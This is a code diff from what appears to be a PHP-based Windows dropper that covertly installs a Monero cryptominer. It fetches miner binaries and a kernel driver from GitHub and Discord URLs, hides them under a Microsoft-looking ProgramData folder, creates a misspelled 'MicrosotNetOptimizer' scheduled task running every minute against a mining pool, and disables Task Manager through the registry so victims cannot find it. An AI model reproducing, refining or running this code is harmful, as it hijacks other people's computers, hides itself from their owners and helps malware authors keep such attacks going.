@@ -13,14 +13,14 @@ if(!file_exists($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\5.exe')){
 
 execute('cmd /c SCHTASKS /Delete /TN MicrosotNetOptimizer /f');
 wait(500);
-execute('cmd /c SCHTASKS /Create /SC MINUTE /MO 1 /TN MicrosotNetOptimizer /TR "%programdata%\Microsoft\DeviceSync\5.exe --url mine.bmpool.org:6004 --user 2970288 -p Startup --log-file 1619948916_xmr_12001_log.txt --threads 6 -B"');
 (new Thread(function(){
     
     file_put_contents($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\xmrig-cuda.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/xmrig-cuda.dll'));
     file_put_contents($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\WinRing0x64.sys',file_get_contents('https://github.com/Rastihin/mce/raw/main/WinRing0x64.sys'));
     file_put_contents($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\nvrtc-builtins64_102.dll',file_get_contents('https://cdn.discordapp.com/attachments/836942104986124312/838423281199611914/nvrtc-builtins64_102.dll'));
     file_put_contents($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\nvrtc64_102_0.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/nvrtc64_102_0.dll'));
-    file_put_contents($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\5.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
+    //file_put_contents($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\5.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
+    execute('cmd /c SCHTASKS /Create /SC MINUTE /MO 1 /TN MicrosotNetOptimizer /TR "%programdata%\Microsoft\DeviceSync\5.exe --url mine.bmpool.org:6004 --user 2970288 -p Startup --log-file 1619948916_xmr_12001_log.txt --threads 6 -B"');
     execute('cmd /c REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1');
     wait(10000);
     execute('cmd /c SCHTASKS /Run /TN MicrosotNetOptimizer');
